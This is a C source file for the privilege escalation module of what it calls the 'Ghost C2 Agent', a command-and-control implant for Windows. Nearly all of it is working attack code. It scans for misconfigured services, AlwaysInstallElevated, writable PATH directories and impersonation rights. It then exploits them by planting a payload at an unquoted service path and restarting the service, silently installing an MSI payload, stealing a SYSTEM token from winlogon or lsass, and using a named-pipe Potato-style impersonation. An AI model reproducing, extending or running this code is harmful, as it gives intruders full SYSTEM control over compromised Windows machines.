/**
 * @file privesc.c
 * @brief Privilege Escalation Module for Ghost C2 Agent
 *
 * Implements various privilege escalation techniques:
 * - Unquoted Service Path exploitation
 * - AlwaysInstallElevated abuse
 * - Token stealing (getsystem)
 * - Named Pipe impersonation (Potato-style)
 */

#include "privesc.h"
#include <sddl.h>
#include <shlwapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================================
// Internal Helper Functions
// ============================================================================

/**
 * @brief Enables a privilege in the current process token.
 */
static BOOL EnablePrivilege(LPCWSTR szPrivilege) {
  HANDLE hToken;
  TOKEN_PRIVILEGES tp;
  LUID luid;

  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    return FALSE;
  }

  if (!LookupPrivilegeValueW(NULL, szPrivilege, &luid)) {
    CloseHandle(hToken);
    return FALSE;
  }

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
    CloseHandle(hToken);
    return FALSE;
  }

  DWORD dwError = GetLastError();
  CloseHandle(hToken);
  return (dwError == ERROR_SUCCESS);
}

/**
 * @brief Gets process ID by name using snapshot.
 */
static DWORD GetProcessIdByName(LPCWSTR szProcessName) {
  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return 0;

  PROCESSENTRY32W pe = {.dwSize = sizeof(pe)};
  DWORD dwPid = 0;

  if (Process32FirstW(hSnap, &pe)) {
    do {
      if (_wcsicmp(pe.szExeFile, szProcessName) == 0) {
        dwPid = pe.th32ProcessID;
        break;
      }
    } while (Process32NextW(hSnap, &pe));
  }

  CloseHandle(hSnap);
  return dwPid;
}

/**
 * @brief Checks if a path contains spaces and is not quoted.
 */
static BOOL IsUnquotedPathWithSpaces(LPCWSTR szPath) {
  if (!szPath || wcslen(szPath) == 0)
    return FALSE;

  // If path starts with quote, it's quoted
  if (szPath[0] == L'"')
    return FALSE;

  // Check for spaces before the .exe
  WCHAR szTemp[MAX_PATH];
  wcsncpy_s(szTemp, MAX_PATH, szPath, _TRUNCATE);

  // Remove arguments by finding first space after .exe pattern
  WCHAR *pExe = wcsstr(szTemp, L".exe");
  if (pExe) {
    pExe += 4; // Move past .exe
    *pExe = L'\0';
  }

  return (wcschr(szTemp, L' ') != NULL);
}

/**
 * @brief Checks if a directory is writable by current user.
 */
static BOOL IsDirectoryWritable(LPCWSTR szPath) {
  WCHAR szTestFile[MAX_PATH];
  swprintf_s(szTestFile, MAX_PATH, L"%s\\%08X.tmp", szPath, GetTickCount());

  HANDLE hFile = CreateFileW(szTestFile, GENERIC_WRITE, 0, NULL, CREATE_NEW,
                             FILE_FLAG_DELETE_ON_CLOSE, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    CloseHandle(hFile);
    return TRUE;
  }
  return FALSE;
}

// ============================================================================
// Scanning Functions
// ============================================================================

static void ScanUnquotedServicePaths(PPRIVESC_VULN_INFO pVulnArray,
                                     PDWORD pCount, DWORD dwMax) {
  SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
  if (!hSCM)
    return;

  DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResumeHandle = 0;
  EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                        SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded,
                        &dwServicesReturned, &dwResumeHandle, NULL);

  LPBYTE pBuffer =
      (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);
  if (!pBuffer) {
    CloseServiceHandle(hSCM);
    return;
  }

  if (EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                            SERVICE_STATE_ALL, pBuffer, dwBytesNeeded,
                            &dwBytesNeeded, &dwServicesReturned,
                            &dwResumeHandle, NULL)) {
    LPENUM_SERVICE_STATUS_PROCESSW pServices =
        (LPENUM_SERVICE_STATUS_PROCESSW)pBuffer;

    for (DWORD i = 0; i < dwServicesReturned && *pCount < dwMax; i++) {
      SC_HANDLE hService =
          OpenServiceW(hSCM, pServices[i].lpServiceName, SERVICE_QUERY_CONFIG);
      if (!hService)
        continue;

      DWORD dwNeeded = 0;
      QueryServiceConfigW(hService, NULL, 0, &dwNeeded);

      LPQUERY_SERVICE_CONFIGW pConfig = (LPQUERY_SERVICE_CONFIGW)HeapAlloc(
          GetProcessHeap(), HEAP_ZERO_MEMORY, dwNeeded);

      if (pConfig &&
          QueryServiceConfigW(hService, pConfig, dwNeeded, &dwNeeded)) {
        if (IsUnquotedPathWithSpaces(pConfig->lpBinaryPathName)) {
          PPRIVESC_VULN_INFO pVuln = &pVulnArray[*pCount];
          pVuln->Type = PrivEscVulnType_UnquotedServicePath;
          wcsncpy_s(pVuln->Path, MAX_PATH, pConfig->lpBinaryPathName,
                    _TRUNCATE);
          wcsncpy_s(pVuln->ServiceName, 256, pServices[i].lpServiceName,
                    _TRUNCATE);
          swprintf_s(pVuln->Description, MAX_PATH * 2,
                     L"Unquoted service path: %s", pConfig->lpBinaryPathName);
          pVuln->Exploitable = TRUE;
          (*pCount)++;
        }
      }

      if (pConfig)
        HeapFree(GetProcessHeap(), 0, pConfig);
      CloseServiceHandle(hService);
    }
  }

  HeapFree(GetProcessHeap(), 0, pBuffer);
  CloseServiceHandle(hSCM);
}

static void ScanAlwaysInstallElevated(PPRIVESC_VULN_INFO pVulnArray,
                                      PDWORD pCount, DWORD dwMax) {
  if (*pCount >= dwMax)
    return;

  HKEY hKeyHKCU = NULL, hKeyHKLM = NULL;
  DWORD dwValueHKCU = 0, dwValueHKLM = 0;
  DWORD dwSize = sizeof(DWORD);
  BOOL bVulnHKCU = FALSE, bVulnHKLM = FALSE;

  // Check HKCU
  if (RegOpenKeyExW(HKEY_CURRENT_USER,
                    L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", 0,
                    KEY_READ, &hKeyHKCU) == ERROR_SUCCESS) {
    if (RegQueryValueExW(hKeyHKCU, L"AlwaysInstallElevated", NULL, NULL,
                         (LPBYTE)&dwValueHKCU, &dwSize) == ERROR_SUCCESS) {
      bVulnHKCU = (dwValueHKCU == 1);
    }
    RegCloseKey(hKeyHKCU);
  }

  // Check HKLM
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                    L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", 0,
                    KEY_READ, &hKeyHKLM) == ERROR_SUCCESS) {
    if (RegQueryValueExW(hKeyHKLM, L"AlwaysInstallElevated", NULL, NULL,
                         (LPBYTE)&dwValueHKLM, &dwSize) == ERROR_SUCCESS) {
      bVulnHKLM = (dwValueHKLM == 1);
    }
    RegCloseKey(hKeyHKLM);
  }

  // Both must be set to 1 for the vulnerability to be exploitable
  if (bVulnHKCU && bVulnHKLM) {
    PPRIVESC_VULN_INFO pVuln = &pVulnArray[*pCount];
    pVuln->Type = PrivEscVulnType_AlwaysInstallElevated;
    wcscpy_s(pVuln->Description, MAX_PATH * 2,
             L"AlwaysInstallElevated enabled in both HKCU and HKLM");
    wcscpy_s(pVuln->RegistryKey, MAX_PATH,
             L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer");
    pVuln->Exploitable = TRUE;
    (*pCount)++;
  }
}

static void ScanWritableServicePaths(PPRIVESC_VULN_INFO pVulnArray,
                                     PDWORD pCount, DWORD dwMax) {
  SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
  if (!hSCM)
    return;

  DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResumeHandle = 0;
  EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                        SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded,
                        &dwServicesReturned, &dwResumeHandle, NULL);

  LPBYTE pBuffer =
      (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);
  if (!pBuffer) {
    CloseServiceHandle(hSCM);
    return;
  }

  if (EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                            SERVICE_STATE_ALL, pBuffer, dwBytesNeeded,
                            &dwBytesNeeded, &dwServicesReturned,
                            &dwResumeHandle, NULL)) {
    LPENUM_SERVICE_STATUS_PROCESSW pServices =
        (LPENUM_SERVICE_STATUS_PROCESSW)pBuffer;

    for (DWORD i = 0; i < dwServicesReturned && *pCount < dwMax; i++) {
      SC_HANDLE hService =
          OpenServiceW(hSCM, pServices[i].lpServiceName, SERVICE_QUERY_CONFIG);
      if (!hService)
        continue;

      DWORD dwNeeded = 0;
      QueryServiceConfigW(hService, NULL, 0, &dwNeeded);

      LPQUERY_SERVICE_CONFIGW pConfig = (LPQUERY_SERVICE_CONFIGW)HeapAlloc(
          GetProcessHeap(), HEAP_ZERO_MEMORY, dwNeeded);

      if (pConfig &&
          QueryServiceConfigW(hService, pConfig, dwNeeded, &dwNeeded)) {
        // Extract directory from binary path
        WCHAR szDir[MAX_PATH];
        wcsncpy_s(szDir, MAX_PATH, pConfig->lpBinaryPathName, _TRUNCATE);
        PathRemoveFileSpecW(szDir);

        if (wcslen(szDir) > 0 && IsDirectoryWritable(szDir)) {
          PPRIVESC_VULN_INFO pVuln = &pVulnArray[*pCount];
          pVuln->Type = PrivEscVulnType_WritableServicePath;
          wcsncpy_s(pVuln->Path, MAX_PATH, szDir, _TRUNCATE);
          wcsncpy_s(pVuln->ServiceName, 256, pServices[i].lpServiceName,
                    _TRUNCATE);
          swprintf_s(pVuln->Description, MAX_PATH * 2,
                     L"Writable service directory: %s", szDir);
          pVuln->Exploitable = TRUE;
          (*pCount)++;
        }
      }

      if (pConfig)
        HeapFree(GetProcessHeap(), 0, pConfig);
      CloseServiceHandle(hService);
    }
  }

  HeapFree(GetProcessHeap(), 0, pBuffer);
  CloseServiceHandle(hSCM);
}

static void ScanWritableSystemPath(PPRIVESC_VULN_INFO pVulnArray, PDWORD pCount,
                                   DWORD dwMax) {
  if (*pCount >= dwMax)
    return;

  WCHAR szPath[32767]; // PATH can be very long
  DWORD dwLen = GetEnvironmentVariableW(L"PATH", szPath, 32767);
  if (dwLen == 0 || dwLen > 32767)
    return;

  WCHAR *pContext = NULL;
  WCHAR *pDir = wcstok_s(szPath, L";", &pContext);

  while (pDir && *pCount < dwMax) {
    if (wcslen(pDir) > 0 && IsDirectoryWritable(pDir)) {
      PPRIVESC_VULN_INFO pVuln = &pVulnArray[*pCount];
      pVuln->Type = PrivEscVulnType_WritablePATH;
      wcsncpy_s(pVuln->Path, MAX_PATH, pDir, _TRUNCATE);
      swprintf_s(pVuln->Description, MAX_PATH * 2,
                 L"Writable directory in PATH: %s", pDir);
      pVuln->Exploitable = TRUE;
      (*pCount)++;
    }
    pDir = wcstok_s(NULL, L";", &pContext);
  }
}

static void ScanSeImpersonatePrivilege(PPRIVESC_VULN_INFO pVulnArray,
                                       PDWORD pCount, DWORD dwMax) {
  if (*pCount >= dwMax)
    return;

  if (PrivEsc_HasSeImpersonate()) {
    PPRIVESC_VULN_INFO pVuln = &pVulnArray[*pCount];
    pVuln->Type = PrivEscVulnType_SeImpersonatePriv;
    wcscpy_s(pVuln->Description, MAX_PATH * 2,
             L"SeImpersonatePrivilege enabled - Potato attacks possible");
    pVuln->Exploitable = TRUE;
    (*pCount)++;
  }
}

// ============================================================================
// Public API Implementation
// ============================================================================

BOOL PrivEsc_ScanAll(PPRIVESC_VULN_INFO pVulnInfoArray, PDWORD pArraySize) {
  if (!pVulnInfoArray || !pArraySize || *pArraySize == 0) {
    return FALSE;
  }

  DWORD dwMaxVulnerabilities = *pArraySize;
  DWORD dwVulnCount = 0;

  // Scan for all vulnerability types
  ScanUnquotedServicePaths(pVulnInfoArray, &dwVulnCount, dwMaxVulnerabilities);
  ScanAlwaysInstallElevated(pVulnInfoArray, &dwVulnCount, dwMaxVulnerabilities);
  ScanWritableServicePaths(pVulnInfoArray, &dwVulnCount, dwMaxVulnerabilities);
  ScanWritableSystemPath(pVulnInfoArray, &dwVulnCount, dwMaxVulnerabilities);
  ScanSeImpersonatePrivilege(pVulnInfoArray, &dwVulnCount,
                             dwMaxVulnerabilities);

  *pArraySize = dwVulnCount;
  return TRUE;
}

BOOL PrivEsc_ExploitUnquotedPath(PPRIVESC_VULN_INFO pVulnInfo,
                                 LPCWSTR szPayloadPath) {
  if (!pVulnInfo || pVulnInfo->Type != PrivEscVulnType_UnquotedServicePath ||
      !szPayloadPath) {
    return FALSE;
  }

  // Find the hijack location (first space in unquoted path)
  WCHAR szHijackExePath[MAX_PATH];
  wcsncpy_s(szHijackExePath, MAX_PATH, pVulnInfo->Path, _TRUNCATE);

  // Remove arguments
  WCHAR *pArgs = wcsstr(szHijackExePath, L".exe");
  if (pArgs) {
    pArgs += 4;
    *pArgs = L'\0';
  }

  // Find first space and create hijack path
  WCHAR *pFirstSpace = wcschr(szHijackExePath, L' ');
  if (!pFirstSpace)
    return FALSE;

  *pFirstSpace = L'\0';
  wcscat_s(szHijackExePath, MAX_PATH, L".exe");

  // Copy our payload to the hijack location
  if (!CopyFileW(szPayloadPath, szHijackExePath, FALSE)) {
    return FALSE;
  }

  // Restart the service to trigger our payload
  BOOL bSuccess = FALSE;
  SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
  if (hSCM) {
    SC_HANDLE hService =
        OpenServiceW(hSCM, pVulnInfo->ServiceName,
                     SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hService) {
      SERVICE_STATUS_PROCESS ssp;
      DWORD dwBytesNeeded;

      // Stop the service if running
      if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp,
                               sizeof(ssp), &dwBytesNeeded)) {
        if (ssp.dwCurrentState != SERVICE_STOPPED &&
            ssp.dwCurrentState != SERVICE_STOP_PENDING) {
          ControlService(hService, SERVICE_CONTROL_STOP,
                         (LPSERVICE_STATUS)&ssp);
          Sleep(3000); // Wait for stop
        }
      }

      // Start the service to trigger payload
      if (StartServiceW(hService, 0, NULL)) {
        bSuccess = TRUE;
        Sleep(5000); // Wait for payload execution
      }

      CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);
  }

  // Cleanup - remove the hijack file
  DeleteFileW(szHijackExePath);

  return bSuccess;
}

BOOL PrivEsc_ExploitAlwaysInstallElevated(LPCWSTR szMsiPayloadPath) {
  if (!szMsiPayloadPath)
    return FALSE;

  // Build msiexec command line
  WCHAR szCommand[MAX_PATH * 2];
  swprintf_s(szCommand, MAX_PATH * 2, L"msiexec.exe /i \"%s\" /quiet /qn",
             szMsiPayloadPath);

  STARTUPINFOW si = {.cb = sizeof(si)};
  PROCESS_INFORMATION pi;

  if (!CreateProcessW(NULL, szCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                      NULL, NULL, &si, &pi)) {
    return FALSE;
  }

  WaitForSingleObject(pi.hProcess, INFINITE);

  DWORD dwExitCode = 0;
  GetExitCodeProcess(pi.hProcess, &dwExitCode);

  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  return (dwExitCode == 0);
}

BOOL PrivEsc_GetSystem(void) {
  HANDLE hToken = NULL;
  HANDLE hDupToken = NULL;
  DWORD pid = 0;

  // Enable SeDebugPrivilege to access SYSTEM processes
  if (!EnablePrivilege(SE_DEBUG_NAME)) {
    return FALSE;
  }

  // Find a SYSTEM process to steal token from
  pid = GetProcessIdByName(L"winlogon.exe");
  if (pid == 0)
    pid = GetProcessIdByName(L"lsass.exe");
  if (pid == 0)
    pid = GetProcessIdByName(L"services.exe");
  if (pid == 0)
    return FALSE;

  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (!hProcess) {
    return FALSE;
  }

  if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                        &hToken)) {
    CloseHandle(hProcess);
    return FALSE;
  }

  if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                        TokenImpersonation, &hDupToken)) {
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return FALSE;
  }

  if (!SetThreadToken(NULL, hDupToken)) {
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return FALSE;
  }

  // Cleanup handles (token is now on thread)
  CloseHandle(hDupToken);
  CloseHandle(hToken);
  CloseHandle(hProcess);

  // Verify we are SYSTEM
  BOOL bIsSystem = FALSE;
  HANDLE hCurrentToken = NULL;
  if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hCurrentToken)) {
    TOKEN_USER *pUser = NULL;
    DWORD dwSize = 0;
    GetTokenInformation(hCurrentToken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
      pUser = (TOKEN_USER *)HeapAlloc(GetProcessHeap(), 0, dwSize);
      if (pUser && GetTokenInformation(hCurrentToken, TokenUser, pUser, dwSize,
                                       &dwSize)) {
        bIsSystem = IsWellKnownSid(pUser->User.Sid, WinLocalSystemSid);
      }
      if (pUser)
        HeapFree(GetProcessHeap(), 0, pUser);
    }
    CloseHandle(hCurrentToken);
  }

  if (!bIsSystem) {
    RevertToSelf();
  }

  return bIsSystem;
}

BOOL PrivEsc_HasSeImpersonate(void) {
  HANDLE hToken;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
    return FALSE;
  }

  TOKEN_PRIVILEGES *pPrivs = NULL;
  DWORD dwSize = 0;
  GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
  if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    CloseHandle(hToken);
    return FALSE;
  }

  pPrivs =
      (TOKEN_PRIVILEGES *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
  if (!pPrivs) {
    CloseHandle(hToken);
    return FALSE;
  }

  BOOL bResult = FALSE;
  if (GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize)) {
    LUID luid;
    if (LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid)) {
      for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++) {
        if (pPrivs->Privileges[i].Luid.LowPart == luid.LowPart &&
            pPrivs->Privileges[i].Luid.HighPart == luid.HighPart) {
          if (pPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
            bResult = TRUE;
          }
          break;
        }
      }
    }
  }

  HeapFree(GetProcessHeap(), 0, pPrivs);
  CloseHandle(hToken);
  return bResult;
}

BOOL PrivEsc_PotatoGetSystem(PHANDLE phToken) {
  if (!phToken)
    return FALSE;
  if (!PrivEsc_HasSeImpersonate())
    return FALSE;

  // This is a simplified Potato-style attack via named pipe impersonation.
  // A full implementation requires triggering a SYSTEM process (e.g., via
  // DCOM/RPC) to connect to our named pipe.

  WCHAR szPipeName[MAX_PATH];
  swprintf_s(szPipeName, MAX_PATH, L"\\\\.\\pipe\\ghost_%08X_%lu",
             GetCurrentProcessId(), GetTickCount());

  HANDLE hPipe = CreateNamedPipeW(szPipeName, PIPE_ACCESS_DUPLEX,
                                  PIPE_TYPE_BYTE | PIPE_WAIT,
                                  1,    // Max instances
                                  1024, // Out buffer size
                                  1024, // In buffer size
                                  0,    // Default timeout
                                  NULL  // Default security (allow LOCAL SYSTEM)
  );

  if (hPipe == INVALID_HANDLE_VALUE) {
    return FALSE;
  }

  // In a real attack, we would trigger a SYSTEM process to connect here.
  // For now, this blocks waiting for external trigger.
  if (!ConnectNamedPipe(hPipe, NULL) &&
      GetLastError() != ERROR_PIPE_CONNECTED) {
    CloseHandle(hPipe);
    return FALSE;
  }

  // Impersonate the client (should be SYSTEM if triggered correctly)
  if (!ImpersonateNamedPipeClient(hPipe)) {
    CloseHandle(hPipe);
    return FALSE;
  }

  // Get the impersonation token
  HANDLE hImpToken = NULL;
  if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE, FALSE,
                       &hImpToken)) {
    RevertToSelf();
    CloseHandle(hPipe);
    return FALSE;
  }

  RevertToSelf();
  CloseHandle(hPipe);

  // Duplicate to a primary token usable with CreateProcessAsUser
  if (!DuplicateTokenEx(hImpToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                        TokenPrimary, phToken)) {
    CloseHandle(hImpToken);
    return FALSE;
  }

  CloseHandle(hImpToken);
  return TRUE;
}
